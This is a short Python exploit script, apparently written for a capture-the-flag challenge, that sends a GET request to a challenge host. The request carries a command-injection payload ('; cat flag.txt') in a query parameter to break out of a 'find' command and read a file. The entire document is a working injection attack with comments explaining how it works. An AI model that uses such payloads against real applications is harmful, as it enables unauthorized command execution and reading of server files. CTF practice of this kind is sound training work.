import requests

# Replace this URL with the actual URL of the vulnerable Flask application
url = 'https://ch251172160606.ch.eng.run/'

# This payload aims to exploit the command injection by terminating the 'find' command and attempting to read 'flag.txt'
payload = {'test': '; cat flag.txt'}

# Sending a GET request with the injected command
response = requests.get(url, params=payload)

# Checking if the request was successful
if response.status_code == 200:
    print("Response received successfully!")
    # Printing the response content to see if the flag was captured
    print("Response content:")
    print(response.text)
else:
    print(f"Failed to receive a response. Status code: {response.status_code}")
